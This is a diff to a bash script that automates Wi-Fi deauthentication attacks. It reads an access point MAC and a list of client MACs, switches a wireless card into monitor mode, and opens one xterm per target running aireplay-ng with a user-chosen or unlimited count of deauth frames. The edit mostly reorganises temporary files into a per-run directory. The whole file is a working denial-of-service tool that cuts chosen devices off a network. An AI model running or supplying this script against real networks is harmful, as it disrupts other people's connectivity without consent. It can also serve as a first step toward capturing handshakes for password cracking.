@@ -1,7 +1,4 @@
 #!/bin/bash
-# Runs aireplay-ng to deauth a list of clients
-# apMac.txt == MAC of the access point
-# targets.txt == list of mac address
 
 # The Help file
 while getopts "h" OPTION
@@ -19,23 +16,35 @@ do
 	esac
 done
 
+# Check if file has been executed as root
+if [ "$EUID" -ne 0 ]
+  then echo "Run as root"
+  echo
+  sleep 5
+  echo "exiting..."
+  exit
+fi
+
+# Get current secounds since epoch, for unique temporary file names
+ID=$(date +"%s")
+
+# Create a temp directory
+tempDir="temp"
+mkdir $ID$tempDir
+
+# Copy input files into temp folder
+cp targets.txt $ID$tempDir/targets.txt
+cp apMac.txt $ID$tempDir/apMac.txt
+
 # x,y positons for spawning xterm windows
 X=(+0 -0 -0 +0 +600 +300 -600 -600 -300 +200 +700)
 Y=(+0 +0 -0 -0 -500 -300 +800 +500 +300 +200 -700)
 
 # Divider
 div='-------------------------------------------------------------------------------------------'
+
 # Iteration variable for positon arrays
 i=0
-
-# Check if file has been executed as root
-if [ "$EUID" -ne 0 ]
-  then echo -e "Run as ${BlinkStart}root ${BlindEnd}moron"
-  exit
-fi
-
-# Get current secounds since epoch, for unique temporary file names
-ID=$(date +"%s")
 
 # Declare temporay file names
 output="Output"
@@ -51,49 +60,34 @@ function finish() {
 	echo $div
 	echo 'Cleaning up...'
 	echo $div
-	if [ -f $ID$targetsLower.txt ]; then
-    		sudo rm $ID$targetsLower.txt
-	fi
-	if [ -f $ID$targets.txt ]; then
-    		sudo rm $ID$targets.txt
-	fi
-	if [ -f $ID$apMacLower.txt ]; then
-    		sudo rm $ID$apMacLower.txt
-	fi
-	if [ -f $ID$apMac.txt ]; then
-    		sudo rm $ID$apMac.txt
-	fi
-	if [ -f $ID$output.txt ]; then
-		sudo rm $ID$output.txt
-	fi
-	
+	sudo rm -r $ID$tempDir
 
 }
 trap finish EXIT
 
 # Move supplied targets into temp targets file
-cat targets.txt > $ID$targets.txt
+cat targets.txt > $ID$tempDir/$targets.txt
 
 # Move the Access Point Mac into a temp folder
-cat apMac.txt > $ID$apMac.txt
+cat apMac.txt > $ID$tempDir/$apMac.txt
 
 # Read interface and check if available
 iw dev
 printf "Interface name:  "
 read int
 echo $div
-intState=`iw dev > $ID$output.txt` 
-if grep -q $int $ID$output.txt; then
-	echo -e "Target interface ${BlinkStart}is available${BlinkEnd}"
+intState=`iw dev > $ID$tempDir/$output.txt` 
+if grep -q $int $ID$tempDir/$output.txt; then
+	echo -e "Target interface is available"
 	echo $div
 else 
-	echo -e "Target is ${BlinkStart}NOT available${BlinkEnd}"
+	echo -e "Target is NOT available"
 	exit
 fi
 
 # Ensure monitor is enabled, if not start monitor and check again, otherwise continue
-sudo iw $int info > $ID$output.txt
-if grep -q monitor $ID$output.txt; then
+sudo iw $int info > $ID$tempDir/$output.txt
+if grep -q monitor $ID$tempDir/$output.txt; then
 	successMessage="Target is in monitor mode"
 	echo -e "${successMessage/Target/$int}"
 	echo $div
@@ -104,8 +98,8 @@ else
 	echo -e "${MonitorMessage/interface/$int}"
 	echo $div
 	sudo airmon-ng start $int > /dev/null
-	sudo iw $int info > $ID$output.txt
-	if grep -q monitor $ID$output.txt; then
+	sudo iw $int info > $ID$tempDir/$output.txt
+	if grep -q monitor $ID$tempDir/$output.txt; then
 		successMessage="Target is in monitor mode"
 		echo "${successMessage/Target/$int}"
 		echo $div
@@ -128,18 +122,18 @@ printf "Enter the number of Deauths to send, 0 is infinite:    "
 read deauths
 
 # Check if 'Client ' is present, if so REMOVE THEM
-#if grep -q 'Client '$ID$targets.txt; then
-#	sed -i 's/Client //g' $ID$targets.txt
+#if grep -q 'Client '$targets.txt; then
+#	sed -i 's/Client //g' $targets.txt
 #fi
 # Convert all macaddress to lowercase
-tr '[:upper:]' '[:lower:]' < $ID$targets.txt > $ID$targetsLower.txt
-tr '[:upper:]' '[:lower:]' < $ID$apMac.txt > $ID$apMacLower.txt
-apMac=`cat $ID$apMacLower.txt`
+tr '[:upper:]' '[:lower:]' < $ID$tempDir/$targets.txt > $ID$tempDir/$targetsLower.txt
+tr '[:upper:]' '[:lower:]' < $ID$tempDir/$apMac.txt > $ID$tempDir/$apMacLower.txt
+apMac=`cat $ID$tempDir/$apMacLower.txt`
 
 # Start  aireplay-ng -0 1 -a Access point mac -c client mac interface
 # each client gets their own terminal window
 #echo $int
-cat $ID$targetsLower.txt | while read line; do
+cat $ID$tempDir/$targetsLower.txt | while read line; do
 	xterm -geometry 90x20${X[i]}${Y[i]} -hold -e sudo aireplay-ng -0 $deauths -a $apMac -c $line $int &
 	i=$((i+1))
 done
